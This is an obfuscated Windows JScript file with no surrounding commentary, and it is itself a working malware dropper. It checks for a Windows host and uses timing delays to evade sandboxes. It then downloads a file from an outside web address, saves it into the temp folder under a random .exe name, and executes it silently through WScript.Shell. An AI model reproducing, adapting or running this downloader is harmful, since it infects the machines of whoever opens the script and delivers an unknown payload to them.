var l0 = false;
var o = "CreateObject";
var A0 = function w() {return WScript[o]("WScript.Shell");}(), qP = 11;
var s = "MSXML2.XMLHTTP";
var Yo = 2123213;
var r = 0;
function VS(aS){A0["Run"](aS, r, r);};
function ix(){return "" + s;};
function X(kj, hM){r = r * 1; return kj - hM;};
function U(){return o;};
/*@cc_on
  @if (@_win32 || @_win64)
    l0 = true;
  @end
@*/
if (l0)
{
var eI = "";
function er(){return 22;};
var xX = 0; var Lv = 0;
function sH()
{
var iy = new this["Date"]();
var f = iy["getUTCMilliseconds"]();
WScript["Sleep"](er());
var iy = new this["Date"]();
var M = iy["getUTCMilliseconds"]();
WScript["Sleep"](er());
var iy = new this["Date"]();
var XQ = iy["getUTCMilliseconds"]();
var xX = "k";
xX = X(M, f);
var Lv = "jM";
Lv = X(XQ, M);
eI = "open";
return X(xX, Lv);
}
var X0 = false;
var wx = false;
for (var i = r; i < er() * 1; i++){if (sH() != r){
X0 = true; 
Lv = "31" + 11 * xX + Lv; 
wx = true; 
break;
}}
function bg() {return ((X0 == true) && (X0 == wx)) ? 1 : r;};
if (X0 && bg() && wx){
function A() {return A0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IuxJ27YFJj0etLc.exe";};
 N = ix();
 Yy = WScript[o](N);
 var l = 1;
 while (l){
try {
Yy[eI]("GET", "http://pasticceriabonci.com/n4usj", false);
Yy["send"]();
n = "Sleep";
for (;;){WScript[n](er() * 11); if (Yy["readystate"] >= 2 * 2) break;};
l = r;
} catch(IB){};
}
function G(z) {var L = (1, 2, 3, 4, 5, z); return L;};
h = WScript[U()]("ADODB.Stream");
N = h;
N[eI]();
N["type"] = G(1);
N["write"](Yy["ResponseBody"]);
h["position"] = G(r);
N["Save" + "ToFile"](A(), 2);
h["c"+"lose"]();
kV = A();
VS(kV);
}
}

